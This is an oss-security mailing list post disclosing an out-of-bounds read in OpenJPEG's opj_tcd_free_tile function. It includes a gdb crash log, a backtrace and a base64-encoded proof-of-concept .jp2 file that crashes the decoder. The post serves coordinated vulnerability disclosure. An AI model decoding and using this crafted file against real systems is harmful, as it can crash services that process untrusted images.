  oss-security - CVE request - OpenJPEG : Out-Of-Bounds Read in opj_tcd_free_tile  function            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [thread-next>] [day] [month] [year] [list]  Date: Mon, 14 Mar From: winsonliu(刘科) <winsonliu@...cent.com> To: oss-security <oss-security@...ts.openwall.com> Subject: CVE request - OpenJPEG : Out-Of-Bounds Read in opj_tcd_free_tile  function  Hi all,  I find a vulnerability of OpenJPEG. The specific flaw exists within the opj_tcd_free_tile function. A specially crafted image file can force Out-Of-Bounds Read occurring in OpenJPEG. This issue can be reproduced in the latest version of OpenJPEG (https://github.com/uclouvain/openjpeg  The detailed information about this issue can be described as follows. --------------------------------- winson@...ntu:~/Desktop/repo/openjpeg/bin$ gdb opj_decompress -q Reading symbols from opj_decompress...(no debugging symbols found)...done.  (gdb) r -o image.pgm -i opj_tcd_free_tile.jp2  Starting program: /home/winson/Desktop/repo/openjpeg/bin/opj_decompress -o image.pgm -i oob_opj_tcd_free_tile.jp2  [INFO] Start to read j2k main header [INFO] Main header has been correctly decoded. [INFO] No decoded area parameters, set the decoded area to the whole image [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No incltree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No imsbtree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No incltree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No imsbtree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No incltree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No imsbtree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No incltree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No imsbtree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No incltree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No imsbtree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No incltree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No imsbtree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No incltree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No imsbtree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No incltree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No imsbtree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No incltree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No imsbtree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No incltree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No imsbtree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No incltree created. [WARNING] tgt_create tree->numnodes == 0, no tree created. [WARNING] No imsbtree created. [INFO] Header of tile 1 / 1 has been read. [INFO] Tile 1/1 has been decoded. [INFO] Image data has been updated with tile 1.  [INFO] Stream reached its end ! precision 31 is larger than 16 : refused. [ERROR] Outfile image.pgm not generated  Program received signal SIGSEGV, Segmentation fault. in opj_tcd_free_tile () from /home/winson/Desktop/repo/openjpeg/bin/libopenjp2.so.7  (gdb) bt #0  in opj_tcd_free_tile () from /home/winson/Desktop/repo/openjpeg/bin/libopenjp2.so.7 #1  in opj_tcd_destroy () from /home/winson/Desktop/repo/openjpeg/bin/libopenjp2.so.7 #2  in opj_j2k_destroy () from /home/winson/Desktop/repo/openjpeg/bin/libopenjp2.so.7 #3  in opj_jp2_destroy () from /home/winson/Desktop/repo/openjpeg/bin/libopenjp2.so.7 #4  in opj_destroy_codec () from /home/winson/Desktop/repo/openjpeg/bin/libopenjp2.so.7 #5  in main ()  (gdb) x /i $eip => mov    (gdb) i r eax            ecx            48 edx            ebx            esp            ebp            esi            0x0 0 edi            0x0 0 eip            eflags         [ CF AF SF IF RF ] cs             ss             0x7b ds             0x7b es             0x7b fs             0x0 0 gs             51  (gdb) x /40xb $eax Cannot access memory at address  (gdb) x /40xb Cannot access memory at address   The attachment is the proof-of-concept file. Alternatively, you can decode the following string using base64 and save the decoded content to a .jp2 file. --------------------------------- AAAADGpQICANCocKAAAAFGZ0eXBqcDIgAAAAAGpwMiAAAABbanAyaAAAABZpaGRyAAAAIAAAACAA AAADAAMAAQAAAAABI2pwMmP/T/9RADIAAAAAACAAAAAgAAAAAAAAAAAAAAAgAAAAIAAAAAAAAAAA AAQECxWeAQEEAQEAAQH/UgAMAAAAAQEFBAQAAf9cABNAKDAwODAwODAwODAwODAwOP9kACUAAUNy 9VfWofCMnawpQPlngP/Z   CREDIT: This vulnerability was discovered by Ke Liu of Tencent's Xuanwu LAB.   Download attachment "oob_opj_tcd_free_tile.jp2" of type "application/octet-stream" bytes)  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      